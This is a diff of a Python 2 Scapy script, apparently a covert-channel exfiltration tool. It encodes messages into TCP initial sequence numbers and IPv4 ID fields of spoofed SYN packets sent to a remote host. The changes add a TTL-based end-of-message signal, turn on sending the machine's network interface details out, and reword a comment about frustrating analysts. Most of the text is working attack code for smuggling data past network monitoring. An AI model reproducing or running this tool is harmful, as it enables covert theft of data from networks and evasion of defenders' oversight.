@@ -19,14 +19,16 @@ The sequence numbers are converted to ASCII by dividing by 16777216 which is a
 representation of 65536*256. [1] see README
 
 TODO:
++ add an end-of-message indicator, ttl=60
 - add try, except where appropriate
 - add mode [demo, live]
   demo mode will send packets immediately
-  live mode will send 1 packet per second 3 times, once a minute (adjustable)
+  live mode will send 1 packet per second 3 times, once a minute (adjustable)???
 - add bounce functionality
-  e.g. bounce SYN packet off an active web server
+  i.e. bounce SYN packet off an active web server check ACK seq number
 - Add dummy packet data to mimic real traffic. (should we bother?)
 - Add TODOs to the issue queue on github.
+- Add more tests, other than convert TCP/IP channels
 
 Questions:
 - Why not bounce off DNS server(s) ?
@@ -106,6 +108,13 @@ def is_32bit(x):
 	else:
 		#print '[-] Warning: int is too large.'
 		return False
+
+
+# Set the ttl=60 to indicate end-of-message
+def send_eom():
+	print '[*] Sending End-Of-Message'
+	pkt.ttl = 60
+	send(pkt)
 
 
 # Convert message
@@ -192,16 +201,19 @@ def add_n0ise_ipid(i):
 # In IPv4, the Identification (ID) field is a 16-bit value.
 # TODO: validate value of ipid (must be a 16-bit value)
 def exfil_ipid():
-	print '[*] Attempting ID identification exfil..'
+	print '[*] Attempting ID identification exfil..msglen', msglen
 	i = 0
 	for c in exfilArray:
+		print '[*] count i:', i
+		if i == msglen:
+			print '[*] EOM'
 		add_n0ise_ipid(i)
 		pkt.ttl = 68
 		pkt.id = exfilArray[i]
 		time.sleep(0.4)
 		send(pkt)
 		i += 1
-
+	send_eom()
 
 # Send message using initial sequence numbers. Add noise.
 def exfil_iseq():
@@ -216,7 +228,7 @@ def exfil_iseq():
 		time.sleep(0.4)
 		send(pkt)
 		i += 1
-
+	send_eom()
 
 def exfil_bounce():
 	print '[*] Attempting Ack sequence number bounce exfil..'
@@ -239,9 +251,9 @@ def send_iface():
 				message = str(netifaces.ifaddresses(face)[2])
 				# debugging
 				print '[*] New message: %s' % message
-				trimmed = trim_message(message)
-				print '[*] Trimmed message: %s' % trimmed
-				convert_message(trimmed)
+				#trimmed = trim_message(message)
+				#print '[*] Trimmed message: %s' % trimmed
+				convert_message(message)
 				# Call the testing method we'd like to test
 				# TODO: run all tests or run a specific test, specify here.
 				exfil_iseq()
@@ -260,7 +272,7 @@ def send_iface():
 convert_iseq(message)
 # How long is our message. We can use this when adding noise. If we use the
 # ttl then this will be easy to crack. We might be able to create an algorithm
-# that's complex enough to at least frustrate our adversaries.
+# that's complex enough to at least frustrate analysts.
 msglen = len(exfilArray)
 # Craft our basic packet.
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
@@ -273,7 +285,7 @@ exfilArray = []  # clear before each use
 
 # ==== use IPID
 print '[*] Testing method IPID..'
-pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')
+pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
 convert_ipid(message)
 msglen = len(exfilArray)
 exfil_ipid()
@@ -281,11 +293,13 @@ print '[*] Sent using IPID: %s' % message
 
 #exfilArray = []
 # ====
-#print '[*] Getting ready to send network interface details'
+print '[*] Getting ready to send network interface details'
 #print '[*] Resetting message and exfilArray'
 #
 #message = ''
 #exfilArray = []
+#pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S') # reset our packet
 #
-## FIXME: something was messing up.. seems to work OK now.
+# FIXME: something was messing up.. seems to work OK now.. the try/except in
+#        the server code seems to have fixed the issue.
 #send_iface()
